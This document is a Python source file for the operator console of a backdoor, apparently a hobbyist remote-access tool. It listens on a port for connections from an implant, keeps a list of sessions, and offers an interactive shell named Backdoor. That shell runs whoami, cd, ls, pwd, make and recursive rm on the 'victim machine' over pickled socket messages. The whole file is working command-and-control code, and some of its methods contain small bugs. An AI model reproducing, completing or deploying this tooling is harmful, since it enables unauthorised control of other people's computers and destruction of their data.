#!/usr/bin/python3.9
# -*- coding: utf-8 -*-

import os
import sys
import zlib
import pickle
import threading
import cmd
from colorama import Fore
import random
import socket
import datetime, time
import string
import struct
import argparse
import shlex
from quo import echo
import stat


default_values = {"PROMPT" : "Console> ","COLOR" : True,"TIMEOUT" : 60,"LHOST" : "0.0.0.0","LPORT" : 9999}


class Color:
    def __init__(self, COLOR_SUPPORT):
        self.COLOR_SUPPORT = COLOR_SUPPORT

    def lyellow(self):
        if self.COLOR_SUPPORT == True:
            return Fore.LIGHTYELLOW_EX
        else:
            return ''

    def lred(self):
        if self.COLOR_SUPPORT == True:
            return Fore.LIGHTRED_EX
        else:
            return ''
    
    def lgreen(self):
        if self.COLOR_SUPPORT == True:
            return Fore.LIGHTGREEN_EX
        else:
            return ''

    def lblue(self):
        if self.COLOR_SUPPORT == True:
            return Fore.LIGHTBLUE_EX
        else:
            return ''

    def reset(self):
        if self.COLOR_SUPPORT == True:
            return Fore.RESET
        else:
            return ''

class Stdout:
    def __init__(self, COLOR_SUPPORT):
        self.COLOR_SUPPORT = COLOR_SUPPORT

    def print_status(self, string):
        print(Color(self.COLOR_SUPPORT).lblue() + "[*]" + Color(self.COLOR_SUPPORT).reset() + " " + str(string).strip())

    def print_error(self, string):
        print(Color(self.COLOR_SUPPORT).lred() + "[-]" + Color(self.COLOR_SUPPORT).reset() + " " + str(string).strip())

    def print_debug(self, string):
        print(Color(self.COLOR_SUPPORT).lgreen() + "[+]" + Color(self.COLOR_SUPPORT).reset() + " " + str(string).strip())

    def print_cool(self, string):
        print(Color(self.COLOR_SUPPORT).lyellow() + "[/\\]" + Color(self.COLOR_SUPPORT).reset() + " " + str(string).strip())

    def print_line(self, string):
        print(Color(self.COLOR_SUPPORT).reset() + "" + str(string).strip())

    def print_ls_formatted(self, info):
        print(Color(self.COLOR_SUPPORT).reset() + f"{info[0]:<11}" + "\t" + f"{info[1]:<25}" + "\t" + f"{info[2]:>15}" + "\t" + f"{info[3]}")

class Stdin:
    def __init__(self, COLOR_SUPPORT):
        self.COLOR_SUPPORT = COLOR_SUPPORT
    
    def ask_question(self, string):
        data = input(Color(self.COLOR_SUPPORT).lyellow() + "[?]" + Color(self.COLOR_SUPPORT).reset() + " " + string)
        return data

class Console(cmd.Cmd):
    x = 0

    values = {
                "PROMPT" : "Console> ",
                "COLOR" : True,
                "TIMEOUT" : 60,
                "LHOST" : "0.0.0.0",
                "LPORT" : 9999
            }

    options = ['PROMPT', 'COLOR', 'TIMEOUT', 'LHOST', 'LPORT']

    prompt = values['PROMPT']
    COLOR = values['COLOR']
    TIMEOUT = values['TIMEOUT']
    LHOST = values['LHOST']
    LPORT = values['LPORT']
    strftime_mode = "%d/%m/%Y %H:%M:%S"


    conn_list = dict()

    def update_values(self):
        self.prompt = self.values['PROMPT']
        self.COLOR = self.values['COLOR']
        self.TIMEOUT = int(self.values['TIMEOUT'])
        self.LHOST = self.values['LHOST']
        self.LPORT = int(self.values['LPORT'])

    def emptyline():
        return

    def do_set(self, args):
        if "-h" in args:
            Stdout(self.COLOR).print_line("""
set: Sets the value of option

                Available options are:

PROMPT    :   Sets the value of prompt (default: Console>)
COLOR     :   Enables or disables the color support. Must be either True or False (default: True)
TIMEOUT   :   Sets the value of socket datetimeout in seconds (defeault: 60 seconds)
LHOST     :   Sets the value of LHOST (default: 0.0.0.0)
LPORT     :   Sets the value of LPORT (default: 9999)\n\n
""")
            return
        if args.split(' ')[0] == '':
            Stdout(self.COLOR).print_error("set: WHAT?")
        else:
            if args.split(' ')[0].upper() in self.options:
                try:
                    self.values[args.split(' ')[0].upper()] = args[len(args.split(' ')[0]):].lstrip() + " "
                    self.update_values()
                except IndexError:
                    Stdout(self.COLOR).print_error("set " + args.split(' ')[0].upper() + ": MISSING VALUE")
                except ValueError:
                    Stdout(self.COLOR).print_error("set " + args.split(' ')[0].upper() + ": SHOULD BE GIVEN AN INTEGER")
            else:
                Stdout(self.COLOR).print_error("set " + args.split(' ')[0].upper() + ": OPTION NOT AVAILABLE")

    def help_set(self):
        self.do_set("set -h")

    def do_show_options(self, args):
        if "-h" in args:
            Stdout(self.COLOR).print_line("""
show_options [option] [options...]

            Shows the values of options set

AVAILABLE OPTIONS ARE: PROMPT, COLOR, TIMEOUT, LHOST, LPORT
""")
            return

        if args.strip() == "" or "all" in args:
            for options in self.values:
                Stdout(self.COLOR).print_debug(options + "\t:\t" +  str(self.values[options]))
        else:
            args = args.split(' ')
            for arg in args:
                if arg.upper() in self.options:
                    Stdout(self.COLOR).print_debug(arg.upper() + "\t:\t" + str(self.values[arg.upper()]))
                else:
                    Stdout(self.COLOR).print_error("Option not available: " + arg.upper())

    def help_show_options(self):
        self.do_show_options("-h")

    def do_exit(self, args):
        if "-h" in args:
            Stdout(self.COLOR).print_line("exit: Exits the framework")
        else:
            sys.exit(0)
    def help_exit(self):
        self.do_exit("-h")

    def do_exploit(self, args):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server_socket.bind((self.LHOST.strip(), int(self.LPORT)))
        except Exception as e:
            Stdout(self.COLOR).print_error("Could not bind the host to the port")
            return
        server_socket.listen(1)
        Stdout(self.COLOR).print_status("Server started successfully at " + Color(self.COLOR).lyellow() + str(self.LHOST).strip() + Color(self.COLOR).reset() + ":" + Color(self.COLOR).lyellow() + str(self.LPORT) + Color(self.COLOR).reset() + " ...")
        connection = server_socket.accept()
        Stdout(self.COLOR).print_status("Connected with " + str(connection[0].getsockname()[0]+":"+str(connection[0].getsockname()[1])) + " " + "  ==>  " + str(connection[1][0]) + ":" + str(connection[1][1]) + "  @  " + str(datetime.datetime.now().strftime(self.strftime_mode)))
        self.conn_list.update({str(self.x):[connection, datetime.datetime.now()]})
        self.x += 1

    def do_sessions(self, args):

        def show_sessions():
            y = 0
            if len(self.conn_list) == 0:
                Stdout(self.COLOR).print_error("Not connected with any backdoor")
                return
            else:
                for key in self.conn_list:
                    Stdout(self.COLOR).print_debug(str(y) + "\t::\t" + str(self.conn_list[str(y)][0][1][0]) + ":" + str(self.conn_list[str(y)][0][0].getsockname()[1]) + "\t=>\t" + self.conn_list[str(y)][0][1][0]+":"+str(self.conn_list[str(y)][0][1][1]) + "\t@\t" + self.conn_list[str(y)][1].strftime(self.strftime_mode))
                    y += 1

        if args.strip() == "":
            args = "show"

        args = args.split(' ')
        
        if args[0].lower() == "show":
            show_sessions()
        elif args[0].lower() in ["interact", "i"]:
            try:
                session_to_interact = int(args[1])
            except IndexError:
                Stdout(self.COLOR).print_error("sessions INTERACT: missing session id")
                return
            except ValueError:
                Stdout(self.COLOR).print_error("sessions INTERACT: session id must be an integer")
                return

            if str(session_to_interact) not in self.conn_list.keys():
                Stdout(self.COLOR).print_error("session id: no connection is associated with id " + str(session_to_interact))
                return
            else: ### AFTER I WRITE THE BACKDOOR CODE, I WILL FIND A WAY TO CONNECT TO IT WITH THIS ID
                try:
                    Backdoor(self.conn_list[str(session_to_interact)][0][0], self.COLOR, self.values, self.conn_list, session_to_interact).cmdloop()
                    del self.conn_list[str(session_to_interact)]
                except Exception as e:
                    Stdout(self.COLOR).print_error("interact: {}".format(str(e)))
        else:
            Stdout(self.COLOR).print_error("sessions " + args[0].upper() + ": Option not available. See -h for more help")

class Backdoor(cmd.Cmd):
    def __init__(self, client_connection, COLOR, values, conn_list, SESSION_ID):
        super().__init__()
        self.client = client_connection
        self.prompt = str('shell@') + str(client_connection.getsockname()[0]) + '# '
        self.COLOR = COLOR
        self.values = values
        self.conn_list = conn_list
        self.SESSION_ID = SESSION_ID

    def emptyline(self):
        return

    def convert_to_human_readable(self, size):
        for x in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size < 1024.0:
                return "%3.1f %s" % (size, x)
            size /= 1024.0

        return size

    
    def error_handler(self, code):
        code = str(code)

        error_codes = {
                '0': 'Success',
                '1': 'File Not Found Error',
                '2': 'Permission Error',
                '3': 'Is A Directory Error',
                '4': 'Not A Directory Error',
                '5': 'OS Error',
                '6': 'Broken Pipe Error',
                '7': 'Timeout Error',
                '8': 'File Exists Error',
                }
        
        if code in error_codes:
            return error_codes[code]
        else:
            return "An error was encountered"

    def send_data(self, TIMEOUT, TERMINATOR_SIZE, DATA):
        self.client.setTimeout(TIMEOUT)
        try:
            terminator = ''.join(random.choices(string.ascii_lowercase+string.digits, k=TERMINATOR_SIZE))
            TERMINATOR = pickle.dumps(['SOCKET_TERMINATOR', terminator])
            self.client.send(TERMINATOR + bytes(" "*(1024-len(TERMINATOR)), 'UTF-8'))
            try:
                self.client.sendall(DATA)
                self.client.send(terminator.encode('UTF-8') + bytes(' '*(1024 - (len(DATA) + len(terminator))), 'utf-8'))
                return True
            except socket.timeout:
                Stdout(self.COLOR).print_error(self.error_handler(code="7"))
            except Exception as e:
                Stdout(self.COLOR).print_error(str(e))
        except socket.timeout:
            Stdout(self.COLOR).print_error(self.error_handler(code="7"))
            return
        except Exception as e:
            Stdout(self.COLOR).print_error(str(e))
            return

    def send_msg(self, sock, msg):
        # Prefix each message with a 4-byte length (network byte order)
        try:
            msg = struct.pack('>I', len(msg)) + msg
            sock.sendall(msg)
        except socket.timeout:
            Stdout(self.COLOR).print_error(self.error_handler(code="7"))
            return

    def recv_msg(self, sock):
        # Read message length and unpack it into an integer
        try:
            raw_msglen = self.recvall(sock, 4)
            if not raw_msglen:
                return None
            msglen = struct.unpack('>I', raw_msglen)[0]
            # Read the message data
            return self.recvall(sock, msglen)
        except socket.timeout:
            Stdout(self.COLOR).print_error(self.error_handler(code="7"))
            return

    def recvall(self, sock, n):
        try:
            # Helper function to recv n bytes or return None if EOF is hit
            data = bytearray()
            while len(data) < n:
                packet = sock.recv(n - len(data))
                if not packet:
                    return None
                data.extend(packet)
            return data
        except socket.timeout:
            Stdout(self.COLOR).print_error(self.error_handler(code="7"))

    def remove(self, options, args):
        for option in options:
            if option in args:
                args = args.replace(option, '')
        return args

    def do_whoami(self, args):
        if "-h" in args:
            Stdout(self.COLOR).print_line("whoami: Prints the username of the victime machine")
        else:
            try:
                self.send_msg(self.client, b"whoami")
                recv = self.recv_msg(self.client)
                if recv == None:
                    Stdout(self.COLOR).print_error(self.error_handler(code="U"))
                else:
                    Stdout(self.COLOR).print_status(recv.decode('UTF-8'))
            except Exception as e:
                Stdout(self.COLOR).print_error(e)
    def help_whoami(self):
        self.do_whoami("-h")

    def do_exit(self, args):
        if "-h" in args:
            Stdout(self.COLOR).print_line("exit: Kills the connection with the client")
        else:
            try:
                self.send_msg(self.client, b"exit")
                del self.conn_list[str(self.SESSION_ID)] ### DELETING IT'S EXISTENCE
                self.client.close()
                Console().cmdloop()
            except Exception as e:
                Stdout(self.COLOR).print_error(e)
    def help_exit(self):
        self.do_exit("-h")

    def do_cd(self, args):
        if args.strip() == '':
            self.do_cd("-h")
        else:
            if "-h" in args:
                Stdout(self.COLOR).print_line("cd: Changes the path")
                return
            else:
                try:
                    args = shlex.quote(args)
                except Exception as e:
                    Stdout(self.COLOR).print_error("cd: " + str(args) + ": " + str(e))
                cmd = ['cd', args]
                cmd = pickle.dumps(cmd)
                self.send_msg(self.client, cmd)
                ack = self.client.recv(1).decode('UTF-8')
                if ack == "0":
                    Stdout(self.COLOR).print_status("cd: " + str(args) + ": " + self.error_handler(0))
                else:
                    Stdout(self.COLOR).print_error("cd: " + str(args) + ": " + self.error_handler(ack))

    def help_cd(self):
        self.do_cd("-h")

    def do_ls(self, args):
        argparser = argparse.ArgumentParser(description="Lists files and directories", prog="ls", exit_on_error=False)
        argparser.add_argument("path", type=str, action="store", nargs="*", help="path to list files and directories", default="./")
        argparser.add_argument("-l", "--long", action="store_true", dest="long_listing", required=False, help="shows more information about files and directories")
        argparser.add_argument("-r", "--reverse", action="store_true", dest="reverse", help="reverses the sorting algorithm")
        argparser.add_argument("-H", "--human", action="store_true", dest="human_readable", help="converts the size to human readable form")
        sort_group = argparser.add_mutually_exclusive_group(required=False)
        sort_group.add_argument("-s", "--size", action="store_true", dest="size", help="sort by the size of files (only works when given with -l or --long)")
        sort_group.add_argument("-t", "--time", action="store_true", dest="Time", help="sort by the creation time of files (only works when given with -l or --long)")
        sort_group.add_argument("-n", "--alphabetic", action="store_true", dest="alphabetic", help="sort by the name of files (only works when given with -l or --long)")

        try:
            parser = argparser.parse_args(args.split(' '))
        except argparse.ArgumentError as e:
            Stdout(self.COLOR).print_error(str("ls: ") + str(e))
            return
        except SystemExit:
            Stdout(self.COLOR).print_line(' ')
            return

        #path = parser.path
        size = parser.size
        Time = parser.Time
        alphabetic = parser.alphabetic
        reverse = parser.reverse
        long_listing = parser.long_listing
        human_readable = parser.human_readable

        args = self.remove(['-s', '--size', '-l', '--long', '-t', '--Time', '-r', '--reverse', '-R', '--recursive', '-n', 'alphabetic', '-H', '--human'], args)

        if args.strip() == '':
            args = "./"

        try:
            args = shlex.split(args)
        except Exception as e:
            Stdout(self.COLOR).print_error("ls: " + str(args) + ": " + str(e))
            return
        
        def ls(path):
            #for path in args:
                cmd = ['ls', path, long_listing]
                cmd = pickle.dumps(cmd)

                try:
                    self.send_msg(self.client, cmd)
                except Exception as e:
                    Stdout(self.COLOR).print_error("ls: " + str(e))
                    return

                try:
                    ack = self.client.recv(1).decode('UTF-8')
                    if ack == "0":
                        pass
                    elif ack == "4":
                        pass
                    else:
                        Stdout(self.COLOR).print_error("ls: " + str(path) + ": " + str(self.error_handler(code=ack)))
                except socket.timeout:
                    Stdout(self.COLOR).print_error("ls: {}".format(str(e)))
                except Exception as e:
                    Stdout(self.COLOR).print_error("ls: " + str(e))
                    return

                if ack == "0" or ack == "4":
                    ls = self.recv_msg(self.client)
                    ls = pickle.loads(ls)
                    if long_listing == False:
                        if alphabetic == True:
                            ls = sorted(ls, key=str.lower, reverse=parser.reverse)
                        else:
                            pass
                        sys.stdout.write(Color(self.COLOR).lblue()+"[*]"+Color(self.COLOR).reset()+" "+"Listing"+" ")
                        echo(path, underline=True)
                        for file in ls:
                            Stdout(self.COLOR).print_line(file)
                    else:
                        sys.stdout.write(Color(self.COLOR).lblue()+"[*]"+Color(self.COLOR).reset()+" "+"Listing"+" ")
                        echo(path, underline=True)
                        echo(str.ljust("File Mode", 11)+"\t"+str.center("Creation Time", 25)+"\t"+str.center("Size", 15)+"\t"+str.rjust("Name", 10), underline=True)
                        print()
                        for file in ls:
                            if alphabetic == size == Time == False:
                                filename = file[0]
                                info = file[1]
                                Size = info.st_size
                                mode = info.st_mode
                                ctime = info.st_ctime
                                if human_readable == True:
                                    Size = self.convert_to_human_readable(Size)
                                else:
                                    pass
                                Stdout(self.COLOR).print_ls_formatted([stat.filemode(mode), time.ctime(ctime), Size, filename])
                            elif alphabetic == True:
                                filename_list = list()
                                for File in ls:
                                    filename_list.append(File[0])

                                filename_list = sorted(filename_list, key=str.lower, reverse=parser.reverse)
                                for File in filename_list:
                                    for File2 in ls:
                                        if File2[0] == File:
                                            if human_readable == True:
                                                Size = self.convert_to_human_readable(File2[1].st_size)
                                            else:
                                                Size = File2[1].st_size

                                            Stdout(self.COLOR).print_ls_formatted([stat.filemode(File2[1].st_mode), time.ctime(File2[1].st_ctime), Size, File])
                                            ls.remove(File2)
                            elif size == True:
                                size_list = list()
                                for File in ls:
                                    size_list.append(File[1].st_size)

                                size_list = sorted(size_list, reverse=parser.reverse)
                                for Size in size_list:
                                    for File in ls:
                                        if File[1].st_size == Size:
                                            if human_readable == True:
                                                Size = self.convert_to_human_readable(File[1].st_size)
                                            else:
                                                Size = File[1].st_size
                                            Stdout(self.COLOR).print_ls_formatted([stat.filemode(File[1].st_mode), time.ctime(File[1].st_ctime), Size, File[0]])
                                            ls.remove(File)
                            elif Time == True:
                                ctime_list = list()
                                for File in ls:
                                    ctime_list.append(File[1].st_ctime)

                                ctime_list = sorted(ctime_list, reverse=parser.reverse)
                                for ctime in ctime_list:
                                    for File in ls:
                                        if File[1].st_ctime == ctime:
                                            if human_readable == True:
                                                Size = self.convert_to_human_readable(File[1].st_size)
                                            else:
                                                Size = File[1].st_size
                                            Stdout(self.COLOR).print_ls_formatted([stat.filemode(File[1].st_mode), time.ctime(ctime), Size, File[0]])
                                            ls.remove(File)

        for path in args:
            ls(path)

    def do_pwd(self, args):
        if "-h" in args:
            Stdout(self.COLOR).print_line("pwd: Prints the current directory")
        else:
            if args.strip() == "":
                try:
                    self.send_msg(self.client, b"pwd")
                    pwd = self.recv_msg(self.client).decode('UTF-8')
                    Stdout(self.COLOR).print_status(pwd)
                except socket.timeout:
                    Stdout(self.COLOR).print_error(error_handler("7"))
                except Exception as e:
                    Stdout(self.COLOR).print_error(e)
            else:
                Stdout(self.COLOR).print_error("pwd: " + args + ": Option not available")
    def help_pwd(self):
        self.do_pwd("-h")

    def do_rm(self, args):
        argparser = argparse.ArgumentParser(description="removes files and directories", prog="rm", exit_on_error=False, conflict_handler="resolve", epilog="If -f is given and words are also present on the command line, those from the command line are treated first")
        argparser.add_argument("path", action="store", nargs="+", help="path to file and directories to remove")
        argparser.add_argument("-r", "--recursive", action="store_true",  dest="recursive", help="removes files and directories recursively")
        argparser.add_argument("-v", "--verbose", action="store_true",  dest="verbose", help="prints the name of each file and directory removed")
        argparser.add_argument("-i", "--interactive", action="store_true",  dest="interactive", help="asks interactively before removing each file and directory")

        try:
            parser = argparser.parse_args(args.split(' '))
        except argparse.ArgumentError as e:
            Stdout(self.COLOR).print_error("rm: " + str(e))
            return
        except SystemExit:
            Stdout(self.COLOR).print_line(' ')
            return

        recursive = parser.recursive
        verbose = parser.verbose
        interactive = parser.interactive

        args = self.remove(['-r', '--recursive', '-i', '--interactive', '-v', '--verbose', '-f', '--file'], args)

        if args.strip() == '':
            return

        try:
            args = shlex.split(args)
        except Exception as e:
            Stdout(self.COLOR).print_error("rm: " + str(args) + ": " + str(e))
            return

        for path in args:
            if interactive == True:
                remove = Stdin(self.COLOR).ask_question("Do you want to remove " + Color(self.COLOR).lyellow() + path + Color(self.COLOR).reset() + ", y/N: ")
                if remove.lower() in ['y', 'ye', 'yes']:
                    pass
                else:
                    continue
                    
            cmd = ['rm', path, recursive]
            cmd = pickle.dumps(cmd)
            try:
                self.send_msg(self.client, cmd)
            except socket.timeout:
                Stdout(self.COLOR).print_error("7")
                return
            except Exception as e:
                Stdout(self.COLOR).print_error("rm: {}".format(str(e)))
                return

            try:
                ack = self.client.recv(1).decode('UTF-8')
            except socket.timeout:
                Stdout(self.COLOR).print_error("rm: {}".format(self.error_handler("7")))
                return
            except Exception as e:
                Stdout(self.COLOR).print_error("rm: {}".format(str(e)))
                return 
            if ack == "0":
                if verbose == True:
                    Stdout(self.COLOR).print_debug("Removed {}{}{} successfully".format(Color(self.COLOR).lyellow(),str(path),Color(self.COLOR).reset()))
                else:
                    pass
            else:
                Stdout(self.COLOR).print_error("rm: {}: {}".format(path, self.error_handler(ack)))
                return
    
    def do_make(self, args):
        argparser = argparse.ArgumentParser(description="Creates empty files or directories", prog="make", exit_on_error=False, conflict_handler="resolve")
        argparser.add_argument("path", nargs="+", action="store", help="path to create files or directories")
        argparser.add_argument("-d", "--directory", action="store_true", dest="directory", required=False, help="Creates directories instead of default files")
        argparser.add_argument("-v", "--verbose", action="store_true", dest="verbose", required=False, help="prints the name of file or directory being created")
        argparser.add_argument("-w", "--overwrite", action="store_true", dest="overwrite", required=False, help="overwrites any file or directory if already present (default: skip)")
        argparser.add_argument("-i", "--interactive", action="store_true", dest="interactive", help="ask before creating any file or directory")

        try:
            parser =  argparser.parse_args(args.split(' '))
        except argparse.ArgumentError as e:
            Stdout(self.COLOR).print_error("make: " + str(e))
            return
        except SystemExit:
            Stdout(self.COLOR).print_line(' ')
            return

        directory = parser.directory
        verbose = parser.verbose
        interactive = parser.interactive
        overwrite = parser.overwrite

        args = self.remove(['-d', '--directory', '-v', '--verbose', '-i', '--interactive', '-w', '--overwrite'], args)

        try:
            args = shlex.split(args)
        except Exception as e:
            Stdout(self.COLOR).print_error("make: {} : {}".format(str(args), str(e)))
            return

        for path in args:
            if interactive == True:
                confirm = Stdin(self.COLOR).ask_question("Do you want to create {}{}{}, y/N: ".format(Color(self.COLOR).lyellow() + path + Color(self.COLOR).reset()))
                if confirm == True:
                    pass
                else:
                    continue
            else:
                pass

            cmd = ['make', path, directory, overwrite]
            cmd = pickle.dumps(cmd)

            self.send_msg(self.client, cmd)
            try:
                ack = self.client.recv(1).decode('UTF-8')
            except socket.timeout:
                Stdout(self.COLOR).print_error(self.error_handler("7"))
                return
            except Exception as e:
                Stdout(self.COLOR).print_error("make: {}".format(e))
                return

            if ack == "0":
                if verbose == True:
                    Stdout(self.COLOR).print_status("Created {}{}{} successfully".format(Color(self.COLOR).lyellow() , path , Color(self.COLOR).reset()))
                else:
                    pass
            else:
                Stdout(self.COLOR).print_error("make: {} : {}".format(path, self.error_handler(str(ack))))



Console().cmdloop()
